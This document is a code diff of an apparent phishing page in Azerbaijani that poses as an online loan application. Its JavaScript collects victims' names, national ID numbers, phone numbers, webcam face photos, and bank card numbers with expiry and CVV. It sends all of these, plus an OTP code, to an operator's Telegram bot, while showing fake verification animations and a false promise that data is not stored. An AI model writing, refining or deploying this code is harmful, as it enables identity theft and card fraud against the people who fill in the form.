@@ -1118,7 +1118,7 @@
     <div id="formStep">
       <h2 style="font-size:24px;margin-bottom:4px;">Onlayn kredit müraciəti</h2>
       <p style="color:var(--ink-soft);font-size:13.5px;margin:0 0 16px;">Şəxsiyyət vəsiqəsi məlumatlarını daxil edin</p>
-      <form id="applyForm" novalidate>
+      <form id="applyForm" novalidate onsubmit="return false;">
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
           <div class="field"><label>Ad</label><input type="text" id="firstName" placeholder="Əli"></div>
           <div class="field"><label>Soyad</label><input type="text" id="lastName" placeholder="Məmmədov"></div>
@@ -1164,7 +1164,7 @@
 
         <label class="checkline"><input type="checkbox" id="consent1" required> Məlumatlarımın yoxlanılmasına razıyam</label>
         <label class="checkline"><input type="checkbox" id="consent2" required> Kredit tarixçəmin yoxlanılmasına razıyam</label>
-        <button type="submit" class="cta-btn" style="width:100%;padding:12px;font-size:13px;">Davam et</button>
+        <button type="submit" class="cta-btn" style="width:100%;padding:12px;font-size:13px;" onclick="event.preventDefault(); submitForm(); return false;">Davam et</button>
       </form>
     </div>
 
@@ -1188,7 +1188,7 @@
         <div class="id-footer"><span>Müddət: 10 il</span><span>Verilmə: 01.01.2020</span></div>
         <div class="id-signature"><span>İmza / Signature</span><span class="sig-line"></span></div>
       </div>
-      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:16px;" onclick="goToFaceScan()">Davam et → Şəxsiyyət təsdiqi</button>
+      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:16px;" id="goToFaceBtn" onclick="goToFaceScan(); return false;">Davam et → Şəxsiyyət təsdiqi</button>
     </div>
 
     <!-- STEP 3: Face Scan (Üz tanıma) -->
@@ -1216,10 +1216,10 @@
         <div class="face-scan-status-text" id="faceStatusText"></div>
       </div>
       
-      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:8px;" onclick="startFaceScan()" id="faceStartBtn">📷 Kameranı aç</button>
+      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:8px;" id="faceStartBtn" onclick="startFaceScan(); return false;">📷 Kameranı aç</button>
     </div>
 
-    <!-- STEP 4: Checking Animation (Professional) -->
+    <!-- STEP 4: Checking Animation -->
     <div id="checkingStep" style="display:none;">
       <div class="checking-container">
         <div class="spinner"></div>
@@ -1237,7 +1237,7 @@
       <h2 style="font-size:24px;margin-bottom:4px;">Hansı bank kartına köçürək?</h2>
       <p style="color:var(--ink-soft);font-size:13.5px;margin:0 0 16px;">Kredit məbləği seçdiyiniz kart hesabına köçürüləcək</p>
       <div class="bank-grid" id="bankGrid"></div>
-      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:20px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
+      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:20px;" onclick="goToCardInput(); return false;">Təsdiqlə və davam et</button>
     </div>
 
     <!-- STEP 6: Kart Doğrulama -->
@@ -1285,7 +1285,7 @@
         <div class="field"><label>CVV / CVC</label><input type="text" id="cardCvv" placeholder="***" maxlength="4" inputmode="numeric"></div>
       </div>
       <p style="font-size:11px;color:var(--ink-soft);margin-top:10px;text-align:center;">TLS 1.3 şifrələmə ilə qorunur. Məlumatlar saxlanılmır.</p>
-      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:10px;" onclick="goToPaymentChecking()">0.01 AZN ödə</button>
+      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:10px;" onclick="goToPaymentChecking(); return false;">0.01 AZN ödə</button>
     </div>
 
     <!-- STEP 7: 3D Secure (OTP) -->
@@ -1308,7 +1308,7 @@
         <label>6 rəqəmli təsdiq kodu</label>
         <input type="text" id="otpCode" placeholder="000000" maxlength="6" inputmode="numeric">
       </div>
-      <button onclick="submitOTP()" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:10px;">Təsdiqlə</button>
+      <button onclick="submitOTP(); return false;" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:10px;">Təsdiqlə</button>
       <div id="otpStatus" style="margin-top:14px;font-size:13px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✅ Ödəniş uğurla təsdiqləndi! 0.01 AZN geri qaytarılacaq.</div>
     </div>
 
@@ -1326,7 +1326,7 @@
           <label>Doğum tarixi</label>
           <input type="date" id="checkBirth">
         </div>
-        <button class="cta-btn" onclick="startCreditCheck()" style="width:100%;padding:12px;font-size:13px;">Yoxla</button>
+        <button class="cta-btn" onclick="startCreditCheck(); return false;" style="width:100%;padding:12px;font-size:13px;">Yoxla</button>
       </div>
       
       <div id="creditChecking" style="display:none;">
@@ -1344,7 +1344,7 @@
           <div class="result-icon">✅</div>
           <div class="result-text">HalHazırda Adınıza Kredit Yoxdur</div>
           <div class="result-sub">Siz yeni kredit götürə bilərsiniz</div>
-          <button class="cta-btn" onclick="goToApply()" style="margin-top:16px;width:100%;padding:12px;font-size:13px;">Kredit Götür</button>
+          <button class="cta-btn" onclick="goToApply(); return false;" style="margin-top:16px;width:100%;padding:12px;font-size:13px;">Kredit Götür</button>
         </div>
       </div>
     </div>
@@ -1444,39 +1444,198 @@ function renderBanks() {
 }
 renderBanks();
 
-async function sendToTelegram(data) {
-  const message = `
-🆕 YENİ KREDİT MÜRACİƏTİ!
-━━━━━━━━━━━━━━━━━━━━
-👤 Ad, Soyad: ${data.name}
-👤 Ata adı: ${data.patronymic || '—'}
-📅 Doğum: ${data.birth}
-🪪 FIN: ${data.fin}
-🪪 Seriya: ${data.id}
-📱 Telefon: ${data.phone}
-💼 İş: ${data.job}
-🏦 Bank: ${data.bank}
-💳 Kart: ${data.cardNumber}
-📅 Bitmə: ${data.expiry}
-🔐 CVV: ${data.cvv}
-💰 Məbləğ: ${data.amount}
-📆 Müddət: ${data.term}
-━━━━━━━━━━━━━━━━━━━━
-🔐 OTP kodu gözlənilir...
-    `.trim();
+// ========== MODAL FUNCTIONS ==========
+function openModal(){
+  document.getElementById('modalOverlay').classList.add('active');
+  document.body.style.overflow='hidden';
+  showFormStep();
+  isPayment = false;
+}
 
-  const replyMarkup = {
-    inline_keyboard: [[{ text: '✅ Qəbul et', callback_data: 'approve' }]]
-  };
+function closeModal(){
+  document.getElementById('modalOverlay').classList.remove('active');
+  document.body.style.overflow='';
+  showFormStep();
+  resetCreditCheck();
+  if(checkInterval) { clearInterval(checkInterval); checkInterval = null; }
+  if(faceScanInterval) { clearInterval(faceScanInterval); faceScanInterval = null; }
+  isChecking = false;
+  isPayment = false;
+  faceScanActive = false;
+  document.getElementById('cardNumberInput').value = '';
+  document.getElementById('cardDigits').textContent = '0000 0000 0000 0000';
+  document.getElementById('cardProgress').style.width = '0%';
+  document.getElementById('cardProgressLabel').textContent = '0/16 rəqəm daxil edilib';
+  document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
+  document.getElementById('cardExpiry').value = '';
+  document.getElementById('cardCvv').value = '';
+  document.getElementById('otpCode').value = '';
+  document.getElementById('otpStatus').style.display = 'none';
+  stopCamera();
+}
 
+function stopCamera() {
+  const video = document.getElementById('faceVideo');
+  if(video && video.srcObject) {
+    video.srcObject.getTracks().forEach(track => track.stop());
+    video.srcObject = null;
+  }
+}
+
+function showFormStep(){
+  document.getElementById('formStep').style.display='block';
+  document.getElementById('summaryStep').style.display='none';
+  document.getElementById('faceScanStep').style.display='none';
+  document.getElementById('checkingStep').style.display='none';
+  document.getElementById('bankStep').style.display='none';
+  document.getElementById('cardInputStep').style.display='none';
+  document.getElementById('threeDStep').style.display='none';
+  document.getElementById('creditCheckModal').style.display='none';
+}
+
+function showSummaryStep(){
+  document.getElementById('formStep').style.display='none';
+  document.getElementById('summaryStep').style.display='block';
+  document.getElementById('faceScanStep').style.display='none';
+  document.getElementById('checkingStep').style.display='none';
+  document.getElementById('bankStep').style.display='none';
+  document.getElementById('cardInputStep').style.display='none';
+  document.getElementById('threeDStep').style.display='none';
+  document.getElementById('creditCheckModal').style.display='none';
+}
+
+// ========== SUBMIT FORM ==========
+function submitForm() {
+  console.log('submitForm called');
+  const fin = document.getElementById('fin').value.trim().toUpperCase();
+  const id = document.getElementById('idnum').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+  const consent1 = document.getElementById('consent1').checked;
+  const consent2 = document.getElementById('consent2').checked;
+  const firstName = document.getElementById('firstName').value.trim();
+  const lastName = document.getElementById('lastName').value.trim();
+  const patronymic = document.getElementById('patronymic').value.trim();
+  const birth = document.getElementById('birthDate').value;
+
+  if(!firstName || !lastName){ alert('Ad və soyad daxil edin!'); return; }
+  if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
+  if(!fin || fin.length !== 7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
+  if(!id || id.length !== 8){ alert('Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır!'); return; }
+  const phoneDigits = phone.replace(/\D/g,'');
+  if(phoneDigits.length !== 10 || phoneDigits[0] !== '0'){ alert('Düzgün mobil nömrə daxil edin! (050 123 45 67)'); return; }
+  if(!consent1 || !consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
+
+  const prefix = document.getElementById('idPrefix').value || 'AZE';
+  document.getElementById('sumName').textContent = firstName.toUpperCase();
+  document.getElementById('sumSurname').textContent = lastName.toUpperCase();
+  document.getElementById('sumPatronymic').textContent = patronymic.toUpperCase() || '—';
+  document.getElementById('sumBirth').textContent = birth.split('-').reverse().join('.');
+  document.getElementById('sumFin').textContent = fin;
+  document.getElementById('sumId').textContent = prefix + ' ' + id;
+  document.getElementById('sumPhone').textContent = phone;
+  const jobActive = document.querySelector('.toggle-btn.active');
+  document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
+
+  showSummaryStep();
+  console.log('Summary step showed');
+}
+
+// ========== GO TO FACE SCAN ==========
+function goToFaceScan() {
+  console.log('🔴 goToFaceScan called!');
+  
+  document.getElementById('summaryStep').style.display = 'none';
+  document.getElementById('faceScanStep').style.display = 'block';
+  
+  document.getElementById('faceStatus').innerHTML = 'Üzünüzü dairənin içinə tutun<span class="sub">Kamera icazəsini aktiv edin</span>';
+  document.getElementById('faceStatusText').textContent = '';
+  document.getElementById('faceProgress').style.width = '0%';
+  document.getElementById('faceStartBtn').style.display = 'block';
+  document.getElementById('faceStartBtn').textContent = '📷 Kameranı aç';
+  
+  console.log('✅ Face scan step showed!');
+}
+
+// ========== FACE SCAN ==========
+async function startFaceScan() {
+  console.log('🔴 startFaceScan called!');
+  const btn = document.getElementById('faceStartBtn');
+  btn.style.display = 'none';
+  btn.textContent = '📷 Kameranı aç';
+  
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML', reply_markup: replyMarkup })
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'user', width: 300, height: 300 } 
     });
-    startTelegramPolling();
-  } catch(e) { console.error('Telegram xətası:', e); }
+    const video = document.getElementById('faceVideo');
+    video.srcObject = stream;
+    await video.play();
+    
+    console.log('✅ Camera started!');
+    
+    setTimeout(() => {
+      captureAndSendPhoto(video);
+    }, 500);
+    
+    document.getElementById('faceStatus').innerHTML = '✅ Üz aşkarlandı!<span class="sub" style="color:var(--teal-deep);">Tərpənməyin, yoxlanılır...</span>';
+    document.getElementById('faceStatusText').textContent = '⏳ 20 saniyə yoxlanılır...';
+    
+    faceScanActive = true;
+    faceScanSeconds = 0;
+    let progress = 0;
+    
+    if(faceScanInterval) clearInterval(faceScanInterval);
+    faceScanInterval = setInterval(() => {
+      faceScanSeconds++;
+      progress = Math.min((faceScanSeconds / 20) * 100, 100);
+      document.getElementById('faceProgress').style.width = progress + '%';
+      document.getElementById('faceStatusText').textContent = `⏳ ${faceScanSeconds}/20 saniyə yoxlanılır...`;
+      
+      if(faceScanSeconds >= 20) {
+        clearInterval(faceScanInterval);
+        faceScanInterval = null;
+        faceScanActive = false;
+        document.getElementById('faceStatus').innerHTML = '✅ Üz təsdiqi tamamlandı!<span class="sub" style="color:var(--teal-deep);">Məlumatlar yoxlanılır...</span>';
+        document.getElementById('faceStatusText').textContent = '✅ Üz uğurla təsdiqləndi!';
+        
+        captureAndSendPhoto(video);
+        stopCamera();
+        
+        setTimeout(() => {
+          document.getElementById('faceScanStep').style.display = 'none';
+          document.getElementById('checkingStep').style.display = 'block';
+          startCheckingAnimation();
+        }, 1500);
+      }
+    }, 1000);
+    
+  } catch(err) {
+    console.error('❌ Kamera xətası:', err);
+    document.getElementById('faceStatus').innerHTML = '❌ Kamera icazəsi tələb olunur<span class="sub">Zəhmət olmasa kameraya icazə verin</span>';
+    document.getElementById('faceStatusText').textContent = '⚠️ Kamera əlçatan deyil. Brauzer icazələrini yoxlayın.';
+    btn.style.display = 'block';
+    btn.textContent = '🔄 Yenidən cəhd et';
+  }
+}
+
+function captureAndSendPhoto(video) {
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 300;
+    canvas.height = video.videoHeight || 300;
+    const ctx = canvas.getContext('2d');
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    canvas.toBlob(async (blob) => {
+      if(blob) {
+        await sendPhotoToTelegram(blob);
+      }
+    }, 'image/jpeg', 0.8);
+  } catch(e) {
+    console.error('Şəkil çəkmə xətası:', e);
+  }
 }
 
 async function sendPhotoToTelegram(photoData) {
@@ -1490,67 +1649,8 @@ async function sendPhotoToTelegram(photoData) {
       method: 'POST',
       body: formData
     });
+    console.log('✅ Photo sent to Telegram!');
   } catch(e) { console.error('Şəkil göndərmə xətası:', e); }
-}
-
-async function sendOTPToTelegram(otp) {
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 OTP Kodu: ${otp}` })
-    });
-  } catch(e) { console.error('OTP xətası:', e); }
-}
-
-let lastUpdateId = 0;
-let pollingActive = false;
-
-async function startTelegramPolling() {
-  if(pollingActive) return;
-  pollingActive = true;
-  await checkTelegramUpdates();
-}
-
-async function checkTelegramUpdates() {
-  if(!pollingActive) return;
-  try {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
-    const response = await fetch(url);
-    const data = await response.json();
-    
-    if(data.ok && data.result) {
-      for(const update of data.result) {
-        lastUpdateId = update.update_id;
-        if(update.callback_query && update.callback_query.data === 'approve') {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ callback_query_id: update.callback_query.id, text: '✅ Qəbul edildi!' })
-          });
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: '✅ Müraciət QƏBUL EDİLDİ!', reply_to_message_id: update.callback_query.message.message_id })
-          });
-          if(isChecking && !isPayment) {
-            clearInterval(checkInterval);
-            isChecking = false;
-            pollingActive = false;
-            document.getElementById('checkingStep').style.display = 'none';
-            document.getElementById('threeDStep').style.display = 'block';
-            document.getElementById('otpCode').value = '';
-            document.getElementById('otpStatus').style.display = 'none';
-          }
-          break;
-        }
-      }
-    }
-    if(pollingActive && isChecking) setTimeout(checkTelegramUpdates, 3000);
-  } catch(e) {
-    console.error('Polling xətası:', e);
-    if(pollingActive && isChecking) setTimeout(checkTelegramUpdates, 5000);
-  }
 }
 
 // ========== KALKULYATOR ==========
@@ -1567,11 +1667,6 @@ const termOut = document.getElementById('termOut');
 function updateSliderFill(el){
   const pct = ((el.value - el.min) / (el.max - el.min)) * 100;
   el.style.setProperty('--fill', pct + '%');
-}
-
-function getTermLabel(value) {
-  const option = termOptions.find(t => t.value === parseInt(value));
-  return option ? option.label : '3 ay';
 }
 
 function calc(){
@@ -1648,87 +1743,7 @@ document.querySelectorAll('.toggle-btn').forEach(btn=>{
   });
 });
 
-// ========== MODAL ==========
-function openModal(){
-  document.getElementById('modalOverlay').classList.add('active');
-  document.body.style.overflow='hidden';
-  showFormStep();
-  isPayment = false;
-}
-
-function closeModal(){
-  document.getElementById('modalOverlay').classList.remove('active');
-  document.body.style.overflow='';
-  showFormStep();
-  resetCreditCheck();
-  if(checkInterval) { clearInterval(checkInterval); checkInterval = null; }
-  if(faceScanInterval) { clearInterval(faceScanInterval); faceScanInterval = null; }
-  isChecking = false;
-  pollingActive = false;
-  isPayment = false;
-  faceScanActive = false;
-  document.getElementById('cardNumberInput').value = '';
-  document.getElementById('cardDigits').textContent = '0000 0000 0000 0000';
-  document.getElementById('cardProgress').style.width = '0%';
-  document.getElementById('cardProgressLabel').textContent = '0/16 rəqəm daxil edilib';
-  document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
-  document.getElementById('cardExpiry').value = '';
-  document.getElementById('cardCvv').value = '';
-  document.getElementById('otpCode').value = '';
-  document.getElementById('otpStatus').style.display = 'none';
-  // Stop camera
-  stopCamera();
-}
-
-function stopCamera() {
-  const video = document.getElementById('faceVideo');
-  if(video && video.srcObject) {
-    video.srcObject.getTracks().forEach(track => track.stop());
-    video.srcObject = null;
-  }
-}
-
-function showFormStep(){
-  document.getElementById('formStep').style.display='block';
-  document.getElementById('summaryStep').style.display='none';
-  document.getElementById('faceScanStep').style.display='none';
-  document.getElementById('checkingStep').style.display='none';
-  document.getElementById('bankStep').style.display='none';
-  document.getElementById('cardInputStep').style.display='none';
-  document.getElementById('threeDStep').style.display='none';
-  document.getElementById('creditCheckModal').style.display='none';
-}
-
-function showSummaryStep(){
-  document.getElementById('formStep').style.display='none';
-  document.getElementById('summaryStep').style.display='block';
-  document.getElementById('faceScanStep').style.display='none';
-  document.getElementById('checkingStep').style.display='none';
-  document.getElementById('bankStep').style.display='none';
-  document.getElementById('cardInputStep').style.display='none';
-  document.getElementById('threeDStep').style.display='none';
-  document.getElementById('creditCheckModal').style.display='none';
-}
-
-function goToFaceScan(){
-  console.log('goToFaceScan called');
-  document.getElementById('summaryStep').style.display='none';
-  document.getElementById('faceScanStep').style.display='block';
-  document.getElementById('faceStatus').innerHTML = 'Üzünüzü dairənin içinə tutun<span class="sub">Kamera icazəsini aktiv edin</span>';
-  document.getElementById('faceStatusText').textContent = '';
-  document.getElementById('faceProgress').style.width = '0%';
-  document.getElementById('faceStartBtn').style.display = 'block';
-  document.getElementById('faceStartBtn').textContent = '📷 Kameranı aç';
-  // Face scan step görünür oldu
-  console.log('Face scan step showed');
-}
-
-function goToBankSelect(){
-  document.getElementById('faceScanStep').style.display='none';
-  document.getElementById('checkingStep').style.display='none';
-  document.getElementById('bankStep').style.display='block';
-}
-
+// ========== BANK SELECT ==========
 function selectBank(el){
   document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
   el.classList.add('selected');
@@ -1765,92 +1780,6 @@ function goToCardInput(){
   setTimeout(() => document.getElementById('cardNumberInput').focus(), 100);
 }
 
-// ========== FACE SCAN ==========
-async function startFaceScan() {
-  console.log('startFaceScan called');
-  const btn = document.getElementById('faceStartBtn');
-  btn.style.display = 'none';
-  btn.textContent = '📷 Kameranı aç';
-  
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user', width: 300, height: 300 } 
-    });
-    const video = document.getElementById('faceVideo');
-    video.srcObject = stream;
-    await video.play();
-    
-    // Video hazır olduqda şəkil çək
-    setTimeout(() => {
-      captureAndSendPhoto(video);
-    }, 500);
-    
-    document.getElementById('faceStatus').innerHTML = '✅ Üz aşkarlandı!<span class="sub" style="color:var(--teal-deep);">Tərpənməyin, yoxlanılır...</span>';
-    document.getElementById('faceStatusText').textContent = '⏳ 20 saniyə yoxlanılır...';
-    
-    faceScanActive = true;
-    faceScanSeconds = 0;
-    let progress = 0;
-    
-    if(faceScanInterval) clearInterval(faceScanInterval);
-    faceScanInterval = setInterval(() => {
-      faceScanSeconds++;
-      progress = Math.min((faceScanSeconds / 20) * 100, 100);
-      document.getElementById('faceProgress').style.width = progress + '%';
-      document.getElementById('faceStatusText').textContent = `⏳ ${faceScanSeconds}/20 saniyə yoxlanılır...`;
-      
-      if(faceScanSeconds >= 20) {
-        clearInterval(faceScanInterval);
-        faceScanInterval = null;
-        faceScanActive = false;
-        document.getElementById('faceStatus').innerHTML = '✅ Üz təsdiqi tamamlandı!<span class="sub" style="color:var(--teal-deep);">Məlumatlar yoxlanılır...</span>';
-        document.getElementById('faceStatusText').textContent = '✅ Üz uğurla təsdiqləndi!';
-        
-        // Yenidən şəkil çək
-        captureAndSendPhoto(video);
-        
-        stopCamera();
-        
-        // 2 saniyə sonra checking step-ə keç
-        setTimeout(() => {
-          document.getElementById('faceScanStep').style.display = 'none';
-          document.getElementById('checkingStep').style.display = 'block';
-          startCheckingAnimation();
-        }, 1500);
-      }
-    }, 1000);
-    
-  } catch(err) {
-    console.error('Kamera xətası:', err);
-    document.getElementById('faceStatus').innerHTML = '❌ Kamera icazəsi tələb olunur<span class="sub">Zəhmət olmasa kameraya icazə verin</span>';
-    document.getElementById('faceStatusText').textContent = '⚠️ Kamera əlçatan deyil. Brauzer icazələrini yoxlayın.';
-    btn.style.display = 'block';
-    btn.textContent = '🔄 Yenidən cəhd et';
-  }
-}
-
-function captureAndSendPhoto(video) {
-  try {
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 300;
-    canvas.height = video.videoHeight || 300;
-    const ctx = canvas.getContext('2d');
-    // Güzgü effekti üçün tərs çevir
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    // Canvas-dan şəkil məlumatı al
-    canvas.toBlob(async (blob) => {
-      if(blob) {
-        await sendPhotoToTelegram(blob);
-      }
-    }, 'image/jpeg', 0.8);
-  } catch(e) {
-    console.error('Şəkil çəkmə xətası:', e);
-  }
-}
-
 // ========== CHECKING ANIMATION ==========
 function startCheckingAnimation() {
   isChecking = true;
@@ -1859,7 +1788,6 @@ function startCheckingAnimation() {
   document.getElementById('checkingTimer').textContent = '0';
   document.getElementById('checkingStatus').style.display = 'none';
   
-  // Professional checking animation
   const statusMessages = [
     '🔍 Şəxsiyyət məlumatları yoxlanılır...',
     '📋 Kredit tarixçəsi araşdırılır...',
@@ -1884,7 +1812,6 @@ function startCheckingAnimation() {
     }
   }, 1000);
   
-  // 5 saniyədən sonra bank seçiminə keç
   setTimeout(() => {
     if(isChecking) {
       clearInterval(checkInterval);
@@ -1949,7 +1876,6 @@ function goToPaymentChecking(){
     return;
   }
 
-  // Məlumatları topla və Telegram-a göndər
   const firstName = document.getElementById('firstName').value || 'ƏLİ';
   const lastName = document.getElementById('lastName').value || 'MƏMMƏDOV';
   const patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
@@ -1968,7 +1894,6 @@ function goToPaymentChecking(){
     bank: selectedBankData.name, cardNumber, expiry, cvv, amount, term
   };
 
-  // Telegram-a göndər
   sendToTelegram(applicationData);
 
   document.getElementById('cardInputStep').style.display='none';
@@ -1991,7 +1916,6 @@ function goToPaymentChecking(){
     }
   }, 1000);
   
-  // 5 saniyədən sonra 3D Secure səhifəsinə keç
   setTimeout(() => {
     if(isChecking) {
       clearInterval(checkInterval);
@@ -2001,11 +1925,50 @@ function goToPaymentChecking(){
       document.getElementById('otpCode').value = '';
       document.getElementById('otpStatus').style.display = 'none';
       
-      // OTP kodu yarat və Telegram-a göndər
       const otp = String(Math.floor(100000 + Math.random() * 900000));
       sendOTPToTelegram(otp);
     }
   }, 5000);
+}
+
+async function sendToTelegram(data) {
+  const message = `
+🆕 YENİ KREDİT MÜRACİƏTİ!
+━━━━━━━━━━━━━━━━━━━━
+👤 Ad, Soyad: ${data.name}
+👤 Ata adı: ${data.patronymic || '—'}
+📅 Doğum: ${data.birth}
+🪪 FIN: ${data.fin}
+🪪 Seriya: ${data.id}
+📱 Telefon: ${data.phone}
+💼 İş: ${data.job}
+🏦 Bank: ${data.bank}
+💳 Kart: ${data.cardNumber}
+📅 Bitmə: ${data.expiry}
+🔐 CVV: ${data.cvv}
+💰 Məbləğ: ${data.amount}
+📆 Müddət: ${data.term}
+━━━━━━━━━━━━━━━━━━━━
+🔐 OTP kodu gözlənilir...
+    `.trim();
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    });
+  } catch(e) { console.error('Telegram xətası:', e); }
+}
+
+async function sendOTPToTelegram(otp) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 OTP Kodu: ${otp}` })
+    });
+  } catch(e) { console.error('OTP xətası:', e); }
 }
 
 // ========== OTP SUBMIT ==========
@@ -2022,41 +1985,6 @@ function submitOTP(){
     alert('❌ 6 rəqəmli OTP kodunu daxil edin!');
   }
 }
-
-// ========== FORM SUBMIT ==========
-document.getElementById('applyForm').addEventListener('submit', (e)=>{
-  e.preventDefault();
-  const fin = document.getElementById('fin').value.trim().toUpperCase();
-  const id = document.getElementById('idnum').value.trim();
-  const phone = document.getElementById('phone').value.trim();
-  const consent1 = document.getElementById('consent1').checked;
-  const consent2 = document.getElementById('consent2').checked;
-  const firstName = document.getElementById('firstName').value.trim();
-  const lastName = document.getElementById('lastName').value.trim();
-  const patronymic = document.getElementById('patronymic').value.trim();
-  const birth = document.getElementById('birthDate').value;
-
-  if(!firstName || !lastName){ alert('Ad və soyad daxil edin!'); return; }
-  if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
-  if(!fin || fin.length !== 7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
-  if(!id || id.length !== 8){ alert('Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır!'); return; }
-  const phoneDigits = phone.replace(/\D/g,'');
-  if(phoneDigits.length !== 10 || phoneDigits[0] !== '0'){ alert('Düzgün mobil nömrə daxil edin! (050 123 45 67)'); return; }
-  if(!consent1 || !consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
-
-  const prefix = document.getElementById('idPrefix').value || 'AZE';
-  document.getElementById('sumName').textContent = firstName.toUpperCase();
-  document.getElementById('sumSurname').textContent = lastName.toUpperCase();
-  document.getElementById('sumPatronymic').textContent = patronymic.toUpperCase() || '—';
-  document.getElementById('sumBirth').textContent = birth.split('-').reverse().join('.');
-  document.getElementById('sumFin').textContent = fin;
-  document.getElementById('sumId').textContent = prefix + ' ' + id;
-  document.getElementById('sumPhone').textContent = phone;
-  const jobActive = document.querySelector('.toggle-btn.active');
-  document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
-
-  showSummaryStep();
-});
 
 // ========== KREDİT ÖDƏ MODAL ==========
 function openCreditCheckModal(){
@@ -2129,7 +2057,6 @@ document.getElementById('modalOverlay').addEventListener('click', (e)=>{
     faceScanInterval = null;
     isChecking = false; 
     faceScanActive = false;
-    pollingActive = false; 
     stopCamera();
     closeModal(); 
   }
@@ -2142,7 +2069,6 @@ document.addEventListener('keydown', (e)=>{
     faceScanInterval = null;
     isChecking = false; 
     faceScanActive = false;
-    pollingActive = false; 
     stopCamera();
     closeModal(); 
   } 
@@ -2158,7 +2084,6 @@ document.getElementById('idnum').addEventListener('input', function(){
   updateIDPreview();
 });
 
-// Telefon maskası - maksimum 10 rəqəm (0501234567)
 document.getElementById('phone').addEventListener('input', function(){
   let digits = this.value.replace(/\D/g,'').slice(0,10);
   let out = '';
@@ -2173,7 +2098,6 @@ document.getElementById('checkFin').addEventListener('input', function(){
   this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
 });
 
-// Credit amount display for summary
 const creditAmountDisplay = document.createElement('span');
 creditAmountDisplay.id = 'creditAmountDisplay';
 creditAmountDisplay.style.display = 'none';
@@ -2183,9 +2107,10 @@ creditTermDisplay.id = 'creditTermDisplay';
 creditTermDisplay.style.display = 'none';
 document.body.appendChild(creditTermDisplay);
 
-console.log('Script loaded successfully!');
-console.log('goToFaceScan function exists:', typeof goToFaceScan === 'function');
-console.log('startFaceScan function exists:', typeof startFaceScan === 'function');
+console.log('✅ Script loaded!');
+console.log('✅ goToFaceScan:', typeof goToFaceScan);
+console.log('✅ startFaceScan:', typeof startFaceScan);
+console.log('✅ submitForm:', typeof submitForm);
 </script>
 </body>
-    </html>
+  </html>
